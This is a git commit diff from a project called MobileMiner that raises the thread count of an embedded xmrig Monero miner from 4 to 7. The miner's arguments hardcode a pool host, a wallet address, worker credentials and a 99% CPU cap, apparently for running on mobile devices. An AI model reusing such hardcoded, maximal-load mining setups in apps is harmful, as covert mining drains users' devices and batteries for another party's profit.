2badb3f310048ae3db52932f3588467d5df8587a
况众文 <kzw@meitu.com>
2018-05-18 13:04:06 +0800

    [update] xmr挖矿参数优化

--- MobileMiner/monero/jni/xmrig.cpp
+++ MobileMiner/monero/jni/xmrig.cpp
@@ -44,7 +44,7 @@ extern "C" {
             (char*)"-o", (char*)"xmr.waterhole.xyz:3333",
             (char*)"-u", (char*)"46Ffvb3jf7ZcVqgPjeReAfZyAk7qKm4FqMb6g6SsT6bpKAhPo9EtNKUVEdMpk62zPpB9GJt75xTD75vYHKredVB3RDHfxdY",
             (char*)"-p", (char*)"worker1:651043704@qq.com",
-            (char*)"--thread", (char*)"4",
+            (char*)"--thread", (char*)"7",
             (char*)"--max-cpu-usage", (char*)"99",
             (char*) "-k"};
          App app(argc, argv);
